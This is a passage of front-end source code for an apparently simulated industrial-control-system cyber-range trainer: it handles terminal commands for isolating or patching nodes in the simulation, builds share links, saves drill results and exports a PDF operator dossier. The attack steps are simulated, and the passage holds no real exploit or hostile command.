      newLogs.push("[*] SIMULATION CLOCK PAUSED. Real-time physics telemetry held.");
    } else if (cmd === "decide") {
      if (!targetArg || !optArg) {
        newLogs.push(
          "[!] ERROR: Usage: decide <d1|d2|d3> <act|defend> (e.g. 'decide d1 act' or 'decide d1 defend').",
        );
      } else {
        const decId = targetArg.toLowerCase();
        const rawChoice = optArg.toUpperCase();
        const choice = (rawChoice === "DEFEND" ? "DEFER" : rawChoice) as ChoiceId;

        if (choice === "ACT" || choice === "DEFER" || rawChoice === "DEFEND") {
          setChoices((prev) => ({ ...prev, [decId]: choice }));
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);

          const decObj = DECISIONS.find((d) => d.id.toLowerCase() === decId) || DECISIONS[0];
          const ev = decObj ? EVENTS.find((e) => e.t === decObj.t) : null;
          const targetId = ev ? ev.node : NODES[3]?.id || "plc-3";
          const targetLabel = NODES.find((n) => n.id === targetId)?.label || targetId.toUpperCase();

          if (choice === "ACT") {
            newLogs.push(
              `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> ACT`,
              `[+] MANUAL OVERRIDE DEPLOYED to ${targetLabel}.`,
              `[*] Telemetry setpoints overridden to safe operational threshold.`,
            );
            setShareToast(`[DECISION ACT]: OVERRIDE ISSUED TO ${targetLabel}`);
          } else {
            setPatchedNodes((prev) => new Set([...Array.from(prev), targetId]));
            setIsolatedNodes((prev) => new Set([...Array.from(prev), targetId]));
            newLogs.push(
              `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> DEFEND`,
              `[+] DEFENSE ENFORCED: Cryptographic patch & air-gap isolation applied to ${targetLabel}.`,
              `[*] Adversary cascade blocked. Systems secured.`,
            );
            setShareToast(`[DECISION DEFEND]: ${targetLabel} PATCHED & AIR-GAPPED`);
          }

          setActiveDecision(null);
          setPlaying(true);
        } else {
          newLogs.push(`[!] ERROR: Invalid choice '${optArg}'. Must be act or defend.`);
        }
      }
    } else if (cmd === "hint" || cmd === "ai-hint" || cmd === "assist") {
      const currentTarget = taskTarget1.id;
      const isTargetIsolated = isolatedNodes.has(currentTarget);
      const isTargetPatched = patchedNodes.has(currentTarget);
      newLogs.push(
        `[*] TACTICAL CYBER RANGE ADVISORY (${sector.toUpperCase()} SECTOR):`,
        `    - Current Threat Target: ${taskTarget1.label} (${currentTarget.toUpperCase()})`,
        `    - Action Option 1: Run 'isolate ${currentTarget}' to sever physical air-gap cascade.`,
        `    - Action Option 2: Run 'patch ${currentTarget}' to apply cryptographic firmware patch.`,
        `    - Action Option 3: Run 'decide d1 act' or 'decide d1 defend' to execute strategy.`,
        `    - Air-Gap Status: ${isTargetIsolated ? "[AIR-GAPPED/CONTAINED]" : "[EXPOSED]"} | Patch Status: ${isTargetPatched ? "[PATCHED]" : "[UNPATCHED]"}`,
      );
    } else if (cmd === "status") {
      const ml = graphState.mlClassification;
      newLogs.push(
        `[*] LIVE REAL-TIME TELEMETRY & CONTAINMENT METRICS (${sector.toUpperCase()} SECTOR):`,
        `    Rotor / Process Speed: ${speedHz.toFixed(2)} Hz`,
        `    Bearing / System Temp: ${bearingC.toFixed(1)} °C`,
        `    Feeder Pressure:       ${pressure.toFixed(2)} bar`,
        `    Simulation Clock:      T+${fmt(t)}`,
        `    MTTD (Detection Time): ${graphState.mttdFormatted}`,
        `    MTTR (Recovery Time):  ${graphState.mttrFormatted}`,
        `    Financial Cost Impact: ${graphState.costFormatted}`,
        `    Impact Value Shed:     ${graphState.impactFormatted}`,
        `    Branch Outcome:        ${graphState.outcomeBranch}`,
        `    Air-Gapped Nodes:      ${isolatedNodes.size}`,
        `    Protected Nodes:       ${blockedNodes.size}`,
        `[+] CYBERX-AI ML THREAT CLASSIFIER:`,
        `    Threat State:          [${ml.threatState}] (Score: ${(ml.anomalyScore * 100).toFixed(0)}%)`,
        `    Primary Drift Feature: ${ml.topFeature}`,
        `    Z-Scores:              Freq: ${ml.zScores.frequency} | Press: ${ml.zScores.pressure} | Temp: ${ml.zScores.temperature} | Chlor: ${ml.zScores.chlorine}`,
      );
    } else {
      newLogs.push(`[!] Command not recognized: '${raw}'. Type 'help' for available commands.`);
    }

    setTerminalLogs(newLogs);
  };

  const buildShareUrl = useCallback(() => {
    const payload = {
      t: Math.round(t * 10) / 10,
      speed: targetSpeed,
      selected,
      choices,
      interactions: interactions.slice(-20),
    };
    const encoded = btoa(encodeURIComponent(JSON.stringify(payload)));
    return `${window.location.origin}${window.location.pathname}#s=${encoded}`;
  }, [t, targetSpeed, selected, choices, interactions]);

  const share = useCallback(async () => {
    const url = buildShareUrl();
    try {
      await navigator.clipboard.writeText(url);
      setShareToast("LINK COPIED · " + url.slice(0, 48) + "…");
    } catch {
      setShareToast(url);
    }
    history.replaceState(null, "", "#s=" + url.split("#s=")[1]);
    window.setTimeout(() => setShareToast(null), 3200);
  }, [buildShareUrl]);

  const [drillSaved, setDrillSaved] = useState(false);

  const saveDrillToLedger = useCallback(async () => {
    try {
      const mttdSec = Math.round(graphState.mttdSeconds ?? 840);
      const mttrSec = Math.round(graphState.mttrSeconds ?? 172800);
      const costNum = Math.round(graphState.costDollars ?? 4100000);
      const scoreNum = Math.max(
        70,
        Math.min(100, Math.round(100 - outcome.mw / 20 - mttdSec / 60)),
      );

      if (!operator?.loggedIn) {
        // Guest mode: save locally in browser guest store (zero DB pollution)
        saveGuestRun({
          id: `TR-GUEST-${Date.now().toString(36).toUpperCase()}-${crypto.randomUUID().slice(0, 6).toUpperCase()}`,
          timestamp: new Date().toISOString(),
          createdAt: new Date().toISOString(),
          sector,
          adversary: exercise.adversary || "APT / Cyber-Physical Vector",
          branch: `Branch ${outcome.branch}: ${outcome.narrative.slice(0, 48)}`,
          mwShed: outcome.mw,
          score: scoreNum,
          shareUrl: buildShareUrl(),
          mttd: outcome.mttd,
          mttr: outcome.mttr,
          cost: outcome.cost,
          isolatedNodes: Array.from(isolatedNodes),
          attackType: "disruption",
          adversaryProfile: "nation-state",
          attackChain: exercise.title,
        });

        setDrillSaved(true);
        setShareToast(`DRILL SAVED TO LOCAL GUEST LEDGER · HW-${outcome.dossierId}`);
        window.setTimeout(() => setShareToast(null), 3500);
        return;
      }

      setShareToast("PERSISTING DRILL TO DATABASE…");
      await saveTrainingRun({
        data: {
          sector,
          adversary: exercise.adversary || "APT / Cyber-Physical Vector",
          branch: `Branch ${outcome.branch}: ${outcome.narrative.slice(0, 48)}`,
          mwShed: outcome.mw,
          mttd: mttdSec,
          mttr: mttrSec,
          cost: costNum,
          score: scoreNum,
          shareUrl: buildShareUrl(),
          isolatedNodes: Array.from(isolatedNodes),
          attackType: "disruption",
          adversaryProfile: "nation-state",
          attackChain: exercise.title,
        },
      });

      setDrillSaved(true);
      setShareToast(`DRILL SAVED TO LEDGER · HW-${outcome.dossierId}`);
      window.setTimeout(() => setShareToast(null), 3500);
    } catch (err) {
      console.error("Failed to log drill run:", err);
      setShareToast("FAILED TO LOG DRILL TO DATABASE");
      window.setTimeout(() => setShareToast(null), 3200);
    }
  }, [
    operator?.loggedIn,
    outcome,
    sector,
    exercise,
    isolatedNodes,
    buildShareUrl,
    graphState.costDollars,
    graphState.mttdSeconds,
    graphState.mttrSeconds,
  ]);

  const [exporting, setExporting] = useState(false);

  const exportDossier = useCallback(async () => {
    if (!operator?.loggedIn) {
      if (!canGuestDownloadPdf()) {
        setShareToast("GUEST LIMIT REACHED (1/1 PDF) · SIGN IN FOR UNLIMITED CERTIFIED REPORTS");
        setAuthGateOpen(true);
        window.setTimeout(() => setShareToast(null), 4000);
        return;
      }
    }

    setExporting(true);
    setShareToast("RENDERING DOSSIER…");
    try {
      const wasPlaying = playing;
      setPlaying(false);
      await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));

      const [{ toPng }, { default: jsPDF }] = await Promise.all([
        import("html-to-image"),
        import("jspdf"),
      ]);

      const bg = "#0a0a0c";
      const fg = "#f4efe6";
      const accent = "#bfff2e";
      const ink = "#1a1a1d";

      // Snapshot the live topology + right-rail frame summary
      const topo = document.getElementById("snapshot-topology");
      const frame = document.getElementById("snapshot-frame");

      const pdf = new jsPDF({ unit: "pt", format: "a4", orientation: "portrait" });
      const W = pdf.internal.pageSize.getWidth();
      const H = pdf.internal.pageSize.getHeight();
      const M = 36;

      const drawChrome = (pageLabel: string) => {
        pdf.setFillColor(bg);
        pdf.rect(0, 0, W, H, "F");
        pdf.setDrawColor(60, 60, 64);
        pdf.setLineWidth(0.5);
        pdf.line(M, 56, W - M, 56);
        pdf.setTextColor(fg);
        pdf.setFont("courier", "bold");
        pdf.setFontSize(8);
        pdf.text("TWINSEC · OPERATOR DOSSIER", M, 44);
        pdf.text(pageLabel, W - M, 44, { align: "right" });
        pdf.setTextColor(accent);
        pdf.text(`HW-${outcome.dossierId}`, M, H - 22);
        pdf.setTextColor(fg);
        pdf.text(
          `T+${fmt(t)} · ${Math.round(targetSpeed)}× · BRANCH ${outcome.branch}`,
          W - M,
          H - 22,
          { align: "right" },
        );

        if (!operator?.loggedIn) {
          pdf.setFont("courier", "bold");
          pdf.setFontSize(7.5);
          pdf.setTextColor(255, 191, 46); // Acid Amber
          pdf.text("[GUEST AUDIT TRIAL · SAMPLE EXPORT 1/1 · REGISTER TO CERTIFY]", W / 2, 44, {
            align: "center",
          });
        }
      };

      // PAGE 1 — COVER
      drawChrome("P. 01 / 04 · COVER");
      pdf.setTextColor(fg);
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(56);
      pdf.text("EXERCISE", M, 140);
      pdf.text(`${exercise.title}.`, M, 200);
      pdf.setFont("times", "italic");
      pdf.setFontSize(14);
      pdf.setTextColor(220, 220, 210);
      const cover = pdf.splitTextToSize(
        `${exercise.site}. A ${Math.round(TOTAL)}-second incident, captured at frame T+${fmt(t)} of ${fmt(TOTAL)}. Branch ${outcome.branch}. ${outcome.narrative}`,
        W - M * 2,
      );
      pdf.text(cover, M, 240);
      pdf.setFont("courier", "normal");
      pdf.setFontSize(9);
      pdf.setTextColor(fg);
      const stats: [string, string][] = [
        ["OPERATOR", "N. ARENS"],
        ["ADVERSARY", exercise.adversary],
        [outcome.impactLabel, outcome.impactFormatted],
        ["MTTD", outcome.mttd],
        ["MTTR", outcome.mttr],
        ["COST", outcome.cost],
        ["TRANSPORT PACE", `${Math.round(targetSpeed)}×`],
        ["DECISIONS", `${Object.keys(choices).length}/${DECISIONS.length}`],
      ];
      stats.forEach(([k, v], i) => {
        const x = M + (i % 2) * (W / 2 - M);
        const y = 360 + Math.floor(i / 2) * 28;
        pdf.setTextColor(140, 140, 140);
        pdf.text(k, x, y);
        pdf.setTextColor(fg);
        pdf.setFontSize(14);
        pdf.text(v, x + 120, y);
        pdf.setFontSize(9);
      });

      // PAGE 2 — TOPOLOGY SNAPSHOT
      if (topo) {
        pdf.addPage();
        drawChrome("P. 02 / 04 · TOPOLOGY SNAPSHOT");
        const img = await toPng(topo, { backgroundColor: bg, pixelRatio: 2, cacheBust: true });
        const dims = await new Promise<{ w: number; h: number }>((res) => {
          const im = new Image();
          im.onload = () => res({ w: im.width, h: im.height });
          im.src = img;
        });
        const ratio = dims.h / dims.w;
        const iw = W - M * 2;
        const ih = Math.min(H - 180, iw * ratio);
        pdf.setTextColor(fg);
        pdf.setFont("helvetica", "bold");
        pdf.setFontSize(22);
        pdf.text("FIG. 01 — PROPAGATION TOPOLOGY", M, 92);
        pdf.setFont("courier", "normal");
        pdf.setFontSize(8);
        pdf.setTextColor(160, 160, 160);
        pdf.text(
          `Captured at T+${fmt(t)} · ${compromisedNodes.size}/${NODES.length} nodes compromised · cascade depth ${Math.max(0, ...NODES.filter((n) => compromisedNodes.has(n.id)).map((n) => n.ring))}/5`,
          M,
          108,
        );
        pdf.addImage(img, "PNG", M, 124, iw, ih);
      }

      // PAGE 3 — CURRENT FRAME + INCIDENT LOG
      pdf.addPage();
      drawChrome("P. 03 / 04 · INCIDENT LOG");
      pdf.setTextColor(fg);
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(28);
      pdf.text("INCIDENT LOG", M, 96);
      if (frame) {
        const fimg = await toPng(frame, { backgroundColor: bg, pixelRatio: 2, cacheBust: true });
        const fdims = await new Promise<{ w: number; h: number }>((res) => {
          const im = new Image();
          im.onload = () => res({ w: im.width, h: im.height });
          im.src = fimg;
        });
        const fr = fdims.h / fdims.w;
        const fw = (W - M * 2) * 0.42;
        pdf.addImage(fimg, "PNG", W - M - fw, 116, fw, fw * fr);
      }
      pdf.setFont("courier", "normal");
      pdf.setFontSize(8.5);
      let y = 130;
      const colW = (W - M * 2) * 0.55;
      EVENTS.forEach((e, i) => {
        const reached = i <= activeIdx;
        pdf.setTextColor(
          reached ? (e.sev === "CRITICAL" ? 255 : 220) : 90,
          reached ? (e.sev === "CRITICAL" ? 90 : 220) : 90,
          reached ? 90 : 90,
        );
        pdf.text(`T+${fmt(e.t)}`, M, y);
        pdf.setTextColor(reached ? 255 : 110, reached ? 255 : 110, reached ? 255 : 110);
        pdf.text(`${e.tag} · ${e.node.toUpperCase()}`, M + 60, y);
        pdf.setFont("times", reached ? "italic" : "normal");
        pdf.setFontSize(10);
        const lines = pdf.splitTextToSize(e.title, colW);
        pdf.text(lines, M, y + 14);
        pdf.setFont("courier", "normal");
        pdf.setFontSize(8.5);
        y += 14 + lines.length * 12 + 8;
        if (y > H - 80) {
          pdf.addPage();
          drawChrome("P. 03 / 04 · INCIDENT LOG (cont.)");
          y = 96;
        }
      });

      // PAGE 4 — DECISIONS + OUTCOME
      pdf.addPage();
      drawChrome("P. 04 / 04 · DECISIONS & OUTCOME");
      pdf.setFillColor(ink);
      pdf.rect(0, 56, W, H - 78, "F");
      pdf.setTextColor(fg);
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(28);
      pdf.text("OPERATOR DECISIONS", M, 96);
      let dy = 130;
      DECISIONS.forEach((d) => {
        const c = choices[d.id];
        const opt = c ? d.options.find((o) => o.id === c) : null;
        pdf.setFont("courier", "bold");
        pdf.setFontSize(8);
        pdf.setTextColor(160, 160, 160);
        pdf.text(`T+${fmt(d.t)} · ${d.trigger.toUpperCase()}`, M, dy);
        pdf.setTextColor(accent);
        pdf.text(c ?? "NOT TAKEN", W - M, dy, { align: "right" });
        pdf.setFont("times", "italic");
        pdf.setFontSize(13);
        pdf.setTextColor(fg);
        const q = pdf.splitTextToSize(d.question, W - M * 2);
        pdf.text(q, M, dy + 16);
        dy += 16 + q.length * 14 + 4;
        if (opt) {
          pdf.setFont("courier", "normal");
          pdf.setFontSize(9);
          pdf.setTextColor(200, 200, 200);
          const cn = pdf.splitTextToSize(`→ ${opt.consequence}`, W - M * 2);
          pdf.text(cn, M, dy);
          dy += cn.length * 12 + 14;
        } else {
          dy += 18;
        }
      });
      pdf.setDrawColor(80);
      pdf.line(M, dy, W - M, dy);
      dy += 28;
      pdf.setFont("helvetica", "bold");
      pdf.setFontSize(48);
      pdf.setTextColor(fg);
      pdf.text(outcome.mw === 0 ? "ZERO IMPACT" : `${outcome.impactFormatted}`, M, dy + 36);
      pdf.setTextColor(accent);
      pdf.setFontSize(20);
      pdf.text(outcome.duration, M, dy + 64);
      pdf.setTextColor(160, 160, 160);
      pdf.setFont("courier", "normal");
      pdf.setFontSize(9);
      pdf.text(
        `${outcome.alarms} · MTTD ${outcome.mttd} · MTTR ${outcome.mttr} · ${outcome.cost}`,
        M,
        dy + 84,
      );

      pdf.save(`twinsec-dossier-HW-${outcome.dossierId}.pdf`);
      // Auto-persist drill to operator ledger (local for guest, DB for operator)
      saveDrillToLedger().catch((err) => {
        log.error("Failed to auto-persist drill to ledger:", err);
      });

      if (!operator?.loggedIn) {
        recordGuestPdfDownload();
        setShareToast("SAMPLE GUEST PDF EXPORTED (1/1) · SIGN IN FOR UNLIMITED CERTIFIED REPORTS");
      } else {
        setShareToast("DOSSIER EXPORTED · twinsec-dossier-HW-" + outcome.dossierId + ".pdf");
      }
      window.setTimeout(() => setShareToast(null), 3500);
      if (wasPlaying) setPlaying(true);
    } catch (err) {
      console.error(err);
      setShareToast("EXPORT FAILED — see console");
      window.setTimeout(() => setShareToast(null), 3200);
    } finally {
      setExporting(false);
    }
  }, [
    t,
    targetSpeed,
    choices,
    outcome,
    compromisedNodes,
    activeIdx,
    playing,
    exercise,
    saveDrillToLedger,
    operator?.loggedIn,
    DECISIONS,
    EVENTS,
    NODES,
    TOTAL,
  ]);

  return (
    <main ref={revealRef} className="min-h-screen bg-background text-foreground flex flex-col">
      {/* Impact tick — silent flash on event crossing */}
      <ImpactTick key={impactKey} />

      <StatusBar
        t={t}
        playing={playing}
        compromised={compromisedNodes.size}
        speed={displaySpeed}
        live={liveMetrics}
        halt={halt}
        incidentLabel={
          activeHistoricalAttack
            ? `${activeHistoricalAttack.code} · ${activeHistoricalAttack.name}`
            : undefined
        }
      />

      {/* TIMELINE TRANSPORT & PLAYBACK CONTROLS */}
      <Transport
        t={t}
        setT={setT}
        playing={playing}
        setPlaying={setPlaying}
        speed={targetSpeed}
        setSpeed={setTargetSpeed}
        displaySpeed={displaySpeed}
        activeIdx={activeIdx}
        choices={choices}
        events={EVENTS}
        decisions={DECISIONS}
        total={TOTAL}
        onStep={() => {
          const nextEvt = EVENTS.find((e) => e.t > t);
          setT(nextEvt ? nextEvt.t : Math.min(TOTAL, t + 10));
        }}
        onReset={() => {
          setT(0);
          setChoices({});
          setIsolatedNodes(new Set());
          setPlaying(false);
        }}
      />

      {/* SECTION 01 — FULL-SCREEN EXPANSIVE COMMAND BRIDGE TOPOLOGY VIEWPORT */}
      <section
        id="snapshot-topology"
        className="relative w-full border-b border-rule min-h-[640px] sm:min-h-[720px] lg:min-h-[820px] bg-background flex flex-col justify-between overflow-hidden"
      >
        {/* Background Canvas: High-Resolution Schematic & Grid Rules */}
        <div className="absolute inset-0 grid-bg opacity-30 pointer-events-none" />
        <img
          src={getSectorSchematic(sector)}
          alt=""
          aria-hidden
          className="absolute inset-0 h-full w-full object-cover opacity-10 pointer-events-none"
        />
        <div className="absolute inset-0 scanline pointer-events-none opacity-40" />

        {/* TOP COMMAND HUD: Exercise Meta, Status & Breadcrumbs */}
        <div className="relative z-10 border-b border-rule bg-background/85 backdrop-blur-sm px-5 sm:px-6 lg:px-10 py-3.5 flex flex-wrap items-center justify-between gap-4">
          <div className="flex flex-wrap items-baseline gap-3 sm:gap-6">
            <span className="mono-label px-2.5 py-1 bg-accent text-accent-foreground font-bold text-xs">
              {sector.toUpperCase()} RANGE
            </span>
            {sector === "water" ? (
              <span className="mono-label px-2 py-0.5 bg-accent/20 text-accent border border-accent text-[10px] font-bold tracking-wider">
                ● LIVE CYBER-PHYSICAL ENGINE
              </span>
            ) : (
              <span className="mono-label px-2 py-0.5 bg-muted text-muted-foreground border border-rule text-[10px] font-bold tracking-wider">
                ○ SCRIPTED REPLAY
              </span>
            )}
            <div>
              <h1 className="display text-2xl sm:text-3xl lg:text-4xl leading-none inline-block">
                {exercise.title}
                <span className="text-accent">.</span>
              </h1>
              <span className="font-serif italic text-xs sm:text-sm text-foreground/70 ml-3">
                {exercise.site} — {exercise.byline}
              </span>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2 sm:gap-3 mono-label text-xs">
            {/* Simulation Mode Toggle (Autonomous Replay vs Tactical Drill) */}
            <button
              type="button"
              onClick={() => {
                const nextMode = !autoPlayMode;
                setAutoPlayMode(nextMode);
                setShareToast(
                  nextMode
                    ? "AUTONOMOUS REPLAY ACTIVE: Watch attack unfold continuously without halts"
                    : "TACTICAL DRILL ACTIVE: Simulator will challenge operator at decision gates",
                );
              }}
              className={`h-8 px-3 border-2 font-mono text-[11px] font-black uppercase transition-all flex items-center gap-1.5 cursor-pointer ${
                autoPlayMode
                  ? "bg-accent text-accent-foreground border-black shadow-[2px_2px_0px_#000000]"
                  : "bg-card text-foreground border-rule hover:border-accent"
              }`}
              title={
                autoPlayMode
                  ? "Continuous Autonomous Run (Does not freeze on decisions)"
                  : "Interactive Range Drill (Pauses for operator mitigation decisions)"
              }
            >
              <span
                className={`size-2 shrink-0 ${autoPlayMode ? "bg-black animate-pulse" : "bg-warn"}`}
              />
              <span>{autoPlayMode ? "AUTONOMOUS REPLAY" : "TACTICAL DRILL"}</span>
            </button>

            {/* Water Sector Scenario Preset Switcher */}
            {sector === "water" && (
              <div className="flex items-center border-2 border-rule bg-card/60">
                <Link
                  to="/simulation"
                  search={{ sector: "water" }}
                  className={`px-2.5 py-1 text-[10px] font-mono font-bold transition-colors ${
                    !search.attack
                      ? "bg-accent text-accent-foreground"
                      : "text-foreground/70 hover:text-foreground hover:bg-muted"
                  }`}
                  title="Basin-3 Chlorine Setpoint Replay (+6x)"
                >
                  BASIN-3 (Cl2)
                </Link>
                <Link
                  to="/simulation"
                  search={{ sector: "water", attack: "oldsmar" }}
                  className={`px-2.5 py-1 text-[10px] font-mono font-bold border-l border-rule transition-colors ${
                    search.attack === "oldsmar"
                      ? "bg-accent text-accent-foreground"
                      : "text-foreground/70 hover:text-foreground hover:bg-muted"
                  }`}
                  title="Oldsmar 2021: Sodium Hydroxide Chemical Overdose (+111x)"
                >
                  OLDSMAR (NaOH)
                </Link>
                <Link
                  to="/simulation"
                  search={{ sector: "water", attack: "aliquippa" }}
                  className={`px-2.5 py-1 text-[10px] font-mono font-bold border-l border-rule transition-colors ${
                    search.attack === "aliquippa"
                      ? "bg-accent text-accent-foreground"
                      : "text-foreground/70 hover:text-foreground hover:bg-muted"
                  }`}
                  title="Aliquippa 2023: Unitronics Booster Station DoS"
                >
                  ALIQUIPPA (PUMP)
                </Link>
              </div>
            )}

            <button
              type="button"
              onClick={() => setBriefingOpen(true)}
              className="h-8 px-3 border-2 border-black bg-muted/80 text-foreground font-mono text-[11px] font-black uppercase shadow-[2px_2px_0px_#000000] hover:border-accent hover:text-accent active:translate-x-0.5 active:translate-y-0.5 transition-all flex items-center gap-1.5 cursor-pointer"
              title="Open Red Cell vs Blue Cell Tactical Mission Briefing"
            >
              <Shield className="size-3.5 stroke-[2.5]" />
              <span className="hidden sm:inline">MISSION BRIEFING</span>
            </button>
            <span className="text-foreground/70 hidden md:inline">
              OPERATOR:{" "}
              <span className="text-foreground font-bold">
                {operator?.callsign ?? "GUEST OPERATOR"}
              </span>
            </span>
            <span className="text-foreground/70 hidden sm:inline">
              ADVERSARY: <span className="text-accent font-bold">{exercise.adversary}</span>
            </span>
            <span className="text-foreground/70 hidden lg:inline">
              PROTOCOLS: <span className="text-foreground">{exercise.protocols}</span>
            </span>
            <span className="flex items-center gap-2 text-accent font-bold px-2 py-1 border border-accent/40 bg-accent/10">
              <span className="size-2 bg-accent animate-pulse-dot" />
              LIVE {Math.round(displaySpeed)}×
            </span>
          </div>
        </div>

        {/* CENTER VIEWPORT: EXPANSIVE EDGE-TO-EDGE TOPOLOGY CANVAS WITH NON-REFLOWING HUD OVERLAYS */}
        <div className="relative flex-1 w-full min-h-[440px] sm:min-h-[500px] lg:min-h-[560px] p-2 sm:p-4 overflow-hidden">
          <Topology2D
            nodes={NODES}
            edges={EDGES}
            compromised={compromisedNodes}
            blockedNodes={blockedNodes}
            selected={selected}
            onSelect={(id, source) => handleSelectNode(id, source)}
            t={t}
            activeNode={activeIdx >= 0 ? EVENTS[activeIdx].node : null}
            isolatedNodes={isolatedNodes}
            commandActiveNode={commandActiveNode}
            commandActiveAction={commandActiveAction}
            previewAirGapNode={previewAirGapNode}
            onHoverNode={handleHoverNode}
            blastRadiusResult={blastRadiusResult}
          />

          {/* FLOATING NON-REFLOWING ASSET DOSSIER HOVER TAB */}
          {hoveredNode && !blastRadiusResult && (
            <div
              className="absolute top-3 right-3 sm:right-6 z-30 pointer-events-auto"
              onPointerEnter={() => {
                if (hoverTimeoutRef.current) {
                  window.clearTimeout(hoverTimeoutRef.current);
                  hoverTimeoutRef.current = null;
                }
              }}
              onPointerLeave={() => {
                setHoveredNodeId(null);
              }}
            >
              <AssetDossierTab
                node={hoveredNode}
                sector={sector}
                isCompromised={compromisedNodes.has(hoveredNode.id)}
                isIsolated={isolatedNodes.has(hoveredNode.id)}
                isShielded={blockedNodes.has(hoveredNode.id)}
                isPatched={patchedNodes.has(hoveredNode.id)}
                onOpenFullDossier={() => {
                  setSelected(hoveredNode.id);
                  setHoveredNodeId(null);
                }}
                onEvaluateBlastRadius={() => {
                  setPreviewAirGapNode(hoveredNode.id);
                }}
                onClose={() => setHoveredNodeId(null)}
              />
            </div>
          )}

          {/* FLOATING NON-REFLOWING PRE-FLIGHT AIR-GAP BLAST RADIUS HUD */}
          {blastRadiusResult && (
            <div className="absolute top-3 left-3 right-3 sm:left-6 sm:right-6 z-30 pointer-events-auto max-h-[85%] overflow-y-auto">
              <BlastRadiusHUD
                result={blastRadiusResult}
                nodes={NODES}
                onConfirmAirGap={(nodeId) => {
                  setIsolatedNodes((prev) => new Set([...Array.from(prev), nodeId]));
                  setPreviewAirGapNode(null);
                  triggerNodeTarget(nodeId, "isolate");
                  playAirGapRelaySound();
                  if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
                  const targetLbl =
                    NODES.find((n) => n.id === nodeId)?.label || nodeId.toUpperCase();
                  setShareToast(`[AIR-GAP ISOLATED]: ${targetLbl}`);
                  setTerminalLogs((prev) => [
                    ...prev,
                    `[+] AIR-GAP EXECUTED VIA HUD: ${targetLbl} (${nodeId.toUpperCase()}) ISOLATED.`,
                    `[*] Physical relay latched. Lateral propagation severed.`,
                    `[*] Enclave reachability recalculated across OT bus.`,
                  ]);
                }}
                onDismiss={() => setPreviewAirGapNode(null)}
              />
            </div>
          )}
        </div>

        {/* BOTTOM INTEGRATED TELEMETRY & TACTICAL DOCK */}
        <div
          id="snapshot-frame"
          className="relative z-10 border-t border-rule bg-background/95 backdrop-blur-sm px-5 sm:px-6 lg:px-10 py-4 grid grid-cols-1 md:grid-cols-12 gap-4 sm:gap-6 items-center"
        >
          {/* Col 1: Real-time Physics Telemetry Gauges (md:col-span-5) */}
          <div className="md:col-span-5 grid grid-cols-3 gap-3 border-r-0 md:border-r border-rule pr-0 md:pr-4">
            <Gauge label="ROTOR" unit="Hz" value={speedHz} min={48} max={54} crit={52.5} />
            <Gauge label="BEARING" unit="°C" value={bearingC} min={50} max={120} crit={95} />
            <Gauge label="FEEDER" unit="bar" value={pressure} min={6} max={9} crit={7} invert />
          </div>

          {/* Col 2: Active Phase & Frame Telemetry (md:col-span-4) */}
          <div className="md:col-span-4 font-mono text-xs space-y-1.5 border-r-0 md:border-r border-rule pr-0 md:pr-4">
            <div className="flex items-center justify-between">
              <span className="mono-label text-[10px] text-foreground/50">ACTIVE PHASE</span>
              <span className="mono-label text-accent font-bold text-xs">
                {activeIdx >= 0 ? EVENTS[activeIdx].tag : "STANDBY"}
              </span>
            </div>
            <div className="flex items-center justify-between text-[11px] text-foreground/80">
              <span className="truncate">
                ORIGIN:{" "}
                <span className="font-bold text-foreground">
                  {activeIdx >= 0 ? EVENTS[activeIdx].node.toUpperCase() : "—"}
                </span>
              </span>
              <span className="mono-label text-[10px] px-1.5 py-0.5 border border-rule">
                {activeIdx >= 0 ? EVENTS[activeIdx].sev : "NOMINAL"}
              </span>
            </div>
            <div className="flex justify-between text-[10px] text-foreground/60">
              <span>
                CASCADE:{" "}
                {Math.max(...NODES.filter((n) => compromisedNodes.has(n.id)).map((n) => n.ring), 0)}
                /5
              </span>
              <span>
                BREACHED: {compromisedNodes.size}/{NODES.length}
              </span>
              <span>CONTAINED: {isolatedNodes.size + patchedNodes.size}</span>
            </div>
          </div>

          {/* Col 3: Direct Tactical Action Triggers (md:col-span-3) */}
          <div className="md:col-span-3 flex flex-col sm:flex-row md:flex-col gap-2">
            <button
              onClick={() => setSelected(activeIdx >= 0 ? EVENTS[activeIdx].node : NODES[0].id)}
              className="w-full bg-accent text-accent-foreground mono-label py-2.5 px-4 font-bold text-xs hover:bg-foreground hover:text-background transition-colors text-center cursor-pointer"
            >
              OPEN ASSET DOSSIER →
            </button>
            <div className="flex gap-2">
              <button
                onClick={() => setBriefingOpen(true)}
                className="flex-1 border border-rule mono-label py-1.5 px-2 text-[10px] hover:border-accent hover:text-accent transition-colors text-center cursor-pointer"
              >
                MISSION BRIEF
              </button>
              <button
                onClick={() => setTerminalOpen(true)}
                className="flex-1 border border-rule mono-label py-1.5 px-2 text-[10px] hover:border-accent hover:text-accent transition-colors text-center cursor-pointer"
              >
                CLI TERMINAL [~_]
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* TIMELINE / LOG */}
      <section className="border-b border-rule">
        <div className="grid grid-cols-12">
          <div className="col-span-12 lg:col-span-7 border-b lg:border-b-0 border-r-0 lg:border-r border-rule p-6 sm:p-8 lg:p-12">
            <div className="grid grid-cols-[minmax(0,1fr)_auto] items-end gap-4 border-b-2 border-foreground pb-5 sm:pb-6">
              <div className="min-w-0">
                <p className="mono-label">SECTION 02 — INCIDENT LOG</p>
                <h2 className="display text-4xl sm:text-5xl md:text-7xl mt-3 leading-none">
                  Watch it
                  <br />
                  <span className="text-accent">unfold.</span>
                </h2>
              </div>
              <span className="mono-label shrink-0 tabular-nums">
                {activeIdx + 1} / {EVENTS.length}
              </span>
            </div>

            <ol className="mt-6 sm:mt-8">
              {activeEvents.map((e, i) => {
                const active = i === activeIdx;
                const past = i < activeIdx;
                const future = i > activeIdx;
                const isBlocked =
                  e.status === "BLOCKED_AIRGAP" ||
                  e.status === "PREVENTED_UPSTREAM" ||
                  e.status === "PATCHED";

                return (
                  <li
                    key={i}
                    onClick={() => setT(e.t + 0.1)}
